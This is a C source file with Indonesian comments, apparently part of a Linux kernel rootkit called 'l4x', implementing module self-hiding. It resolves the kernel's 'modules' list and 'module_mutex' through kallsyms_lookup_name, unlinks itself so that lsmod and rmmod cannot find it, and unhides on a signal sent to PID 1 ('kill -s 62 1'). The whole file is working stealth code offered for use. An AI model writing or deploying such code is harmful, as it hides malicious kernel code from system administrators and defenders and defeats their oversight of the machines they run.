/*
 * module_hide.c (legacy) — self-hide modul dari daftar kernel.
 *
 * KEUNGGULAN ERA INI: kallsyms_lookup_name MASIH diekspor (mati di5.7),
 * jadi mencari symbol "modules" & "module_mutex" sesederhana:
 *     kallsyms_lookup_name("module_mutex")
 * Tidak perlu trik kprobe seperti backend modern.
 *
 * Pola unlock/lock identik dengan delete_module() kernel:
 *     mutex_lock(&module_mutex) -> list_del_rcu(&THIS_MODULE->list) -> unlock
 *
 * KONTRAK: set disembunyikan, rmmod TIDAK menemukan modul ini —
 * sebelum unload: kill -s 62 1 (tampilkan lagi) atau reboot.
 * v1 jujur: /sys/module/<nama> masih terlihat.
 *
 * Catatan: module_mutex & modules adalah symbol STATIK — butuh
 * KALLSYMS_ALL=y (standar di distro Ubuntu/RHEL). Kalau tidak ada:
 * fitur nonaktif, load tetap jalan.
 */
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/rculist.h>
#include <linux/errno.h>
#include <linux/printk.h>
#include "l4x.h"

static struct list_head *g_modules;
static struct mutex *g_module_mutex;
static bool g_hidden;

int l4x_modhide_init(void)
{
	g_modules = (struct list_head *)kallsyms_lookup_name("modules");
	g_module_mutex = (struct mutex *)kallsyms_lookup_name("module_mutex");

	if (!g_modules || !g_module_mutex) {
		pr_warn("l4x: modules/module_mutex tak ditemukan"
			" (KALLSYMS_ALL mati?) — self-hide nonaktif\n");
		g_modules = NULL;
		g_module_mutex = NULL;
		return -ENOENT;
	}
	pr_info("l4x: self-hide siap\n");
	return 0;
}

bool l4x_modhide_active(void)
{
	return g_hidden;
}

int l4x_modhide_hide(void)
{
	if (g_hidden)
		return 0;
	if (!g_module_mutex)
		return -EOPNOTSUPP;

	mutex_lock(g_module_mutex);
	list_del_rcu(&THIS_MODULE->list);
	mutex_unlock(g_module_mutex);

	g_hidden = true;
	pr_info("l4x: modul disembunyikan (kill -s 62 1 untuk tampilkan / rmmod!)\n");
	return 0;
}

int l4x_modhide_show(void)
{
	if (!g_hidden)
		return 0;
	if (!g_module_mutex || !g_modules)
		return -EOPNOTSUPP;

	mutex_lock(g_module_mutex);
	list_add_rcu(&THIS_MODULE->list, g_modules);
	mutex_unlock(g_module_mutex);

	g_hidden = false;
	pr_info("l4x: modul dikembalikan (siap rmmod)\n");
	return 0;
}

void l4x_modhide_exit(void)
{
	if (g_hidden)
		l4x_modhide_show();
}
